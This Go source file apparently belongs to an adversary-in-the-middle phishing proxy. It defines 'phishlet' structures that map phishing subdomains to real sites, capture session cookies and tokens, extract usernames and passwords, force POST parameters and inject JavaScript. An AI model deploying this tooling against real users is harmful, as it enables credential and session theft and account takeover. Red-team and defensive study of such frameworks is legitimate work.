package aitm

import (
	"regexp"
	"strings"
	"sync"
)

// PhishletStore is the persistence interface required by PhishletService.
type PhishletStore interface {
	GetPhishletConfig(name string) (*PhishletConfig, error)
	SetPhishletConfig(cfg *PhishletConfig) error
	ListPhishletConfigs() ([]*PhishletConfig, error)
	DeletePhishletConfig(name string) error

	CreateSubPhishlet(sp *SubPhishlet) error
	GetSubPhishlet(name string) (*SubPhishlet, error)
	ListSubPhishlets(parent string) ([]*SubPhishlet, error)
	DeleteSubPhishlet(name string) error
}

// PhishletDef is the compiled, fully-resolved form of a phishlet YAML file.
// All regex fields are pre-compiled. Template parameters have been substituted.
type PhishletDef struct {
	Name        string
	Author      string
	Version     string
	ProxyHosts  []ProxyHost
	SubFilters  []SubFilter
	AuthTokens  []TokenRule
	Credentials CredentialRules
	Login       LoginSpec
	ForcePosts  []ForcePost
	Intercepts  []InterceptRule
	JSInjects   []JSInject
	AuthURLs    []*regexp.Regexp
}

// MatchesHost returns true if hostname corresponds to any of this phishlet's proxy hosts.
func (p *PhishletDef) MatchesHost(hostname, baseDomain string) bool {
	for _, ph := range p.ProxyHosts {
		if hostname == ph.PhishSubdomain+"."+baseDomain {
			return true
		}
	}
	return false
}

// FindLanding returns the ProxyHost marked is_landing, or nil.
func (p *PhishletDef) FindLanding() *ProxyHost {
	for i := range p.ProxyHosts {
		if p.ProxyHosts[i].IsLanding {
			return &p.ProxyHosts[i]
		}
	}
	return nil
}

// MatchesAuthURL returns true if rawURL matches any auth_url pattern.
func (p *PhishletDef) MatchesAuthURL(rawURL string) bool {
	for _, re := range p.AuthURLs {
		if re.MatchString(rawURL) {
			return true
		}
	}
	return false
}

// PhishletConfig is the runtime state of a phishlet stored in the database.
// Separate from PhishletDef (the static YAML definition).
type PhishletConfig struct {
	Name        string
	BaseDomain  string
	DNSProvider string
	Hostname    string
	UnauthURL   string
	SpoofURL    string
	Enabled     bool
	Hidden      bool
}

// SubPhishlet is a named instantiation of a template PhishletDef with resolved params.
type SubPhishlet struct {
	Name       string
	ParentName string
	Params     map[string]string
}

// ProxyHost maps a phishing subdomain to a real upstream host.
type ProxyHost struct {
	PhishSubdomain string
	OrigSubdomain  string
	Domain         string
	IsLanding      bool
	IsSession      bool
	AutoFilter     bool
}

// SubFilter is a compiled search/replace rule applied to proxied response bodies.
type SubFilter struct {
	Hostname   string
	MimeTypes  []string
	Search     *regexp.Regexp
	Replace    string
	WithParams []string
}

// MatchesMIME returns true if this filter applies to the given MIME type.
func (s *SubFilter) MatchesMIME(mimeType string) bool {
	for _, m := range s.MimeTypes {
		if strings.HasPrefix(mimeType, m) {
			return true
		}
	}
	return false
}

// TokenType classifies how an auth token is extracted.
type TokenType int

const (
	TokenTypeCookie TokenType = iota
	TokenTypeBody
	TokenTypeHTTPHeader
)

// TokenRule describes how to capture one auth token from a response.
type TokenRule struct {
	Type     TokenType
	Domain   string
	Path     *regexp.Regexp
	Name     *regexp.Regexp
	Search   *regexp.Regexp
	HTTPOnly bool
	Always   bool
}

// CredentialRules groups the extraction rules for username, password, and custom fields.
type CredentialRules struct {
	Username CredentialRule
	Password CredentialRule
	Custom   []CustomCredentialRule
}

// CredentialRule is a key+search regex pair that extracts one field from POST/JSON.
type CredentialRule struct {
	Key    *regexp.Regexp
	Search *regexp.Regexp
	Type   string // "post" or "json"
}

// CustomCredentialRule is like CredentialRule but stores into Session.Custom[Name].
type CustomCredentialRule struct {
	Name string
	CredentialRule
}

// LoginSpec identifies where the login form lives.
type LoginSpec struct {
	Domain string
	Path   string
}

// ForcePost describes a POST parameter to inject or override.
type ForcePost struct {
	Path       *regexp.Regexp
	Conditions []ForcePostCondition
	Params     []ForcePostParam
}

type ForcePostCondition struct {
	Key    *regexp.Regexp
	Search *regexp.Regexp
}

type ForcePostParam struct {
	Key   string
	Value string
}

// InterceptRule matches a request and returns a fully custom response.
type InterceptRule struct {
	Path        *regexp.Regexp
	BodySearch  *regexp.Regexp
	StatusCode  int
	ContentType string
	Body        string
}

// JSInject defines a JavaScript snippet to inject into matching pages.
type JSInject struct {
	TriggerDomain string
	TriggerPath   *regexp.Regexp
	Script        string
}

// PhishletService owns all business logic for phishlet lifecycle.
type PhishletService struct {
	store           PhishletStore
	bus             EventBus
	dns             *DNSService
	cert            *CertService
	activeHostnames sync.Map // hostname → phishlet name
}

func NewPhishletService(store PhishletStore, bus EventBus, dns *DNSService, cert *CertService) *PhishletService {
	return &PhishletService{store: store, bus: bus, dns: dns, cert: cert}
}

// GetActiveHostnames returns a snapshot of hostname → phishlet name for the proxy router.
func (s *PhishletService) GetActiveHostnames() map[string]string {
	out := make(map[string]string)
	s.activeHostnames.Range(func(k, v any) bool {
		out[k.(string)] = v.(string)
		return true
	})
	return out
}
